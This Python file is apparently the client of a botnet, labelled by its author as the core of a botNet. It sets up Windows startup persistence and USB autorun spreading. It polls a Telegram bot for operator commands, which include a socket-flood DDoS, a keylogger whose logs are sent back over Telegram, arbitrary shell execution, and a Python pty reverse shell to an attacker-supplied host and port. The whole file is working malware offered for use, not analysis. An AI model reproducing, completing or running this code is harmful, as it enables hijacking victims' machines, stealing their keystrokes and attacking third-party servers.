#!/usr/bin/python3

from json import loads
import logging
import platform
from subprocess import check_output
from time import sleep
from os import system
from platform import node, uname
from socket import *
from requests import post
from bs4 import BeautifulSoup
from pynput.keyboard import Listener
from getpass import getuser

# TODO this is core of our botNet and not complete yet


def start_up():
    """
    use for create start up file for windows
    :return: none
    """
    if platform.system() == "Windows":  # TODO test codes on windows!
        user = node()
        user = user.replace("-PC", "")
        power = r'copy info.exe "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start ' \
                r'Menu\Programs\Startup\"'.format(user)
        system(power)


def auto_copy():  # TODO test codes on windows!
    """
    copy our program to other drives and create auto run
    :return: none
    """
    if platform.system() == "Windows" or platform.system() == "windows":
        for i in ["[AutoRun]", "OPEN=info.exe", "ICON=info.exe", "ACTION=Start my application", "LABEL=My Drive"]:
            cmd = "Echo " + i + " >> " + "AutoRun.inf"
            system(cmd)
        for i in ["d", "e", "f", "h", "i", "j", "k"]:
            cmd = "copy info.exe " + str(i) + ":"
            system(cmd)
            cmd = "copy AutoRun.inf " + str(i) + ":"
            system(cmd)


def getting_func():
    """
    use for get commands
    :return: some codes for find command and sender
    """
    link = "https://www.askapache.com/online-tools/http-headers-tool/"
    URL_GET = "https://api.telegram.org/bot" + token + "/GetUpdates"
    payload_GET = {"http_url": URL_GET,
                   "http_request_method": "POST",
                   "http_showbody": "Show Body"
                   }
    res_GET = post(link, payload_GET)
    source = res_GET.text
    soup = BeautifulSoup(source, "html.parser")
    result = soup.find("pre", title="showbody").text
    return result


def message_func(message, user):
    """
    use for send message to admin
    :param message: message for send
    :param user: admin id
    :return:
    """
    link = "https://www.askapache.com/online-tools/http-headers-tool/"
    URL_POST = "https://api.telegram.org/bot" + token + "/SendMessage?chat_id=" + str(user) + "&text=" + message
    payload_POST = {"http_url": URL_POST,
                    "http_request_method": "POST"
                    }
    post(link, payload_POST)
    return 0


def DDOS(target):
    """
    ddos function it can send many request in short time
    :param target: enter the target domain
    :return: none
    """
    if "https" or "http" in target:
        target = target.replace("https", "")
        target = target.replace("http", "")

    ip = gethostbyname(target)
    n = 0
    while n < 10000:
        n += 1
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, 80))
        buff = "User-Agent:" + "A" * 500
        s.sendall(b"GET / HTTP/1.1\r\n" + b"\n\n" + buff.encode('utf-8'))
        s.close()


def key_logger(log_dir):
    """
    save press key in a file and you can dump with shell
    :param log_dir: enter the directory for save the key logs
    :return: none
    """
    logging.basicConfig(filename=(log_dir + "klg.txt"), level=logging.DEBUG, format='%(message)s')

    x = 0

    def on_press(key):  # TODO we want after 256 char exit from function
        nonlocal x
        x += 1
        logging.info(str(key))
        if int(x) == 256:
            print("can't work!")
            return 0

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    info = uname()
    info = info[0:3] + info[4:]
    start_up()
    auto_copy()
    admin = 0000000000              # add admin id here
    token = "yourTelegramBotToken"  # add token here
    while True:
        finalResult = getting_func()
        data = loads(finalResult)["result"][-1]["message"]["text"]
        sender = str(loads(finalResult)["result"][-1]["message"]["chat"]["id"])

        if data[0:7] == "/sayHey" and admin == sender:
            message = str(info) + "_i'm_online"
            message_func(message, sender)
        elif data[0:7] == "/shutUp" and admin == sender:
            message = str(info) + "_i'm_downed"
            message_func(message, sender)
            exit()
        elif data[0:4] == "Hi":
            message = "Hi"
            message_func(message, sender)
        elif data[0:6] == "/d_dos" and admin == sender:
            target = data[7:]
            message = str(info) + "_ur_target_is_under_attack"
            message_func(message, sender)
            DDOS(target)
        elif data[0:6] == "/power" and admin == sender:
            command = data[7:]
            res = str(check_output(command, shell=True))[2:-1]
            message = str(info) + "_res=" + res
            message_func(message, sender)
        elif data[0:5] == "/keys" and admin == sender:  # TODO test it
            if platform.system() == "Linux":
                user = getuser()
                log_dir = "/" + str(user) + "/Documents/"
                key_logger(log_dir)
            else:
                user = node()
                user = user.replace("-PC", "")
                log_dir = "c:/Users/" + str(user) + "/Documents/"
                key_logger(log_dir)
        elif data[0:12] == "/backConnect" and admin == sender:  # TODO handle errors & add this for windows platform
            if platform.system() == "Linux":
                ip = data[13:].split(":")[0]
                port = data[13:].split(":")[1]
                command = "export RHOST = " + ip + ";export RPORT = " + port + ";python -c " + 'import sys,socket,os,' \
                                                                                               'pty;s=socket.socket(' \
                                                                                               ');s.connect((' \
                                                                                               'os.getenv("RHOST"),' \
                                                                                               'int(os.getenv(' \
                                                                                               '"RPORT"))));[os.dup2(' \
                                                                                               's.fileno(),' \
                                                                                               'fd) for fd in (0,1,' \
                                                                                               '2)];pty.spawn(' \
                                                                                               '"/bin/sh") '
                system(command)
                message = str(info) + "_res=running"
                message_func(message, sender)
        elif data[0:10] == "/clearPass" and admin == sender:  # TODO add browser password cleaner
            if platform.system() == "Linux":
                pass
            else:
                pass
        elif data[0:9] == "/downKeys" and admin == sender:
            if platform.system() == "Linux":  # TODO handle {no such file error} & test for windows
                user = getuser()
                command = "less /" + str(user) + "/Documents/klg.txt"
                res = str(check_output(command, shell=True))[2:-1]
                message = str(info) + "_keys=" + res
                message_func(message, sender)
                command = "rm /" + str(user) + "/Documents/klg.txt"
                res = str(check_output(command, shell=True))[2:-1]
                message = str(info) + "_res=" + res + "_logRemoved"
                message_func(message, sender)
            else:
                user = node()
                user = user.replace("-PC", "")
                command = "more /" + str(user) + "/Documents/klg.txt"
                res = str(check_output(command, shell=True))[2:-1]
                message = str(info) + "_keys=" + res
                message_func(message, sender)
                command = "del /" + str(user) + "/Documents/klg.txt"
                res = str(check_output(command, shell=True))[2:-1]
                message = str(info) + "_res=" + res + "_logRemoved"
                message_func(message, sender)
        elif data[0:9] == "/shutDown" and admin == sender:  # TODO test this command for windows
            message = str(info) + "_i_will_powerOff"
            message_func(message, sender)
            if platform.system() == "Linux":
                command = "sudo shutdown now"
                res = check_output(command, shell=True)
                message = str(info) + "_res=" + str(res) + "_ok"
                message_func(message, sender)
            else:
                command = "shutdown -s -t 00"
                res = check_output(command, shell=True)
                message = str(info) + "_res=" + str(res) + "_ok"
                message_func(message, sender)
        elif data[0:8] == "/reStart" and admin == sender:  # TODO test this command for windows
            message = str(info) + "_i_will_reboot"
            message_func(message, sender)
            if platform.system() == "Linux":
                command = "sudo reboot"
                res = check_output(command, shell=True)
                message = str(info) + "_res=" + str(res) + "_ok"
                message_func(message, sender)
            else:
                command = "shutdown /r /f"
                res = check_output(command, shell=True)
                message = str(info) + "_res=" + str(res) + "_ok"
                message_func(message, sender)
        sleep(6)

# TODO add virus behavior to clone
# TODO create irc line over tor
